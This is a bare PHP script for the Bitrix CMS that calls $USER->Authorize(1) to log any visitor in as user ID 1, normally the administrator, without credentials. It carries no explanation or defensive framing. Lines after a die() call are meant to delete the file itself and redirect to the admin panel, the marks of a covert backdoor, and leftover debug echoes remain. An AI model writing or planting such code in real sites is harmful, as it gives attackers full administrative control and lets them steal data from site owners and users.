<? 
echo 'tut' . $_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php";
//require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php"); 

require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
echo 'auth';
global $USER; 
$USER->Authorize(1); 
die();
@unlink(__FILE__); 
LocalRedirect("/bitrix/admin/"); 
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?> 

